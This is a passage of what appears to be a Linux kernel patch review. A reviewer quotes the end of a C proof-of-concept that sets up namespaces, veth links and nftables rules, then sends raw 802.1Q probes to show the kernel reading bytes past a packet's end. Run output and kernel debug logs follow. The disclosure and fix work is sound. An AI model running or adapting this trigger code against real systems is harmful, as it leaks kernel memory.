+        int r, t, hit =3D 0;
+
+        setvbuf(stdout, NULL, _IONBF, 0);
+        CPU_ZERO(&cs);
+        CPU_SET(0, &cs);
+        sched_setaffinity(0, sizeof(cs), &cs);
+
+        if (getuid() =3D=3D 0) {                    /* drop to an
+unprivileged user */
+                setgroups(0, NULL);
+                if (setresgid(1000, 1000, 1000) || setresuid(1000, 1000, 10=
+00))
+                        die("drop privileges");
+                prctl(PR_SET_DUMPABLE, 1);      /* lets us write our
+own uid_map */
+        }
+        printf("[*] uid=3D%d\n", getuid());
+        enter_ns();
+        /* keep IPv6 autoconf traffic off the veths */
+        write_file("/proc/sys/net/ipv6/conf/all/disable_ipv6", "1");
+        write_file("/proc/sys/net/ipv6/conf/default/disable_ipv6", "1");
+        rtnl_veth();
+        link_up("vp0");
+        link_up("vp1");
+        nft_setup();
+
+        pfd =3D socket(AF_PACKET, SOCK_RAW, 0);
+        ifi =3D if_nametoindex("vp0");
+        if (pfd < 0 || !ifi)
+                die("AF_PACKET");
+
+
+        printf("[*] sending %d 18-byte 802.1Q probes with no IPv6
+header\n", ROUNDS);
+        read_counters();
+        memcpy(before, cnt, sizeof(before));
+        for (r =3D 0; r < ROUNDS; r++) {
+                tx(probe, sizeof(probe), ETH_P_8021Q);
+                usleep(20000);
+        }
+        read_counters();
+        for (t =3D 0; t < 256; t++) {
+                if (cnt[t] =3D=3D before[t])
+                        continue;
+                printf("    rule 0x%02x fired %llu/%d: kernel read
+byte 0x%02x past skb tail\n",
+                      t, (unsigned long long)(cnt[t] - before[t]), ROUNDS, =
+t);
+                hit +=3D cnt[t] - before[t];
+        }
+        printf("[%c] %d/%d probes leaked a byte from past the end of
+the packet\n",
+              hit ? '+' : '-', hit, ROUNDS);
+        return !hit;
+}
+```
+
+My run output of your attached patch:
+```log
+[*] sending 64 18-byte 802.1Q probes with no IPv6 header
+    rule 0x01 fired 25/64: kernel read byte 0x01 past skb tail
+    rule 0x02 fired 2/64: kernel read byte 0x02 past skb tail
+    rule 0x03 fired 1/64: kernel read byte 0x03 past skb tail
+    rule 0x74 fired 1/64: kernel read byte 0x74 past skb tail
+...
+```
+
+I also confirmed the same result after inserting some debug to the kernel.
+
+```log
+[    4.041624] DBG_OOB head=3Dffff888021df96c0 nh=3D20 tail=3D20 end=3D384
+byte=3D0x00 ptr16_23(head+544)=3D0xdf
+[    4.061809] DBG_OOB head=3Dffff888021df9a00 nh=3D20 tail=3D20 end=3D384
+byte=3D0x00 ptr16_23(head+544)=3D0xdf
+[    4.081970] DBG_OOB head=3Dffff888021df63c0 nh=3D20 tail=3D20 end=3D384
+byte=3D0x00 ptr16_23(head+544)=3D0xdf
+[    4.102192] DBG_OOB head=3Dffff888021df6080 nh=3D20 tail=3D20 end=3D384
+byte=3D0x00 ptr16_23(head+544)=3D0xdf
+[    4.122357] DBG_OOB head=3Dffff888021de5a00 nh=3D20 tail=3D20 end=3D384
+byte=3D0x01 ptr16_23(head+544)=3D0xde
+...
+```
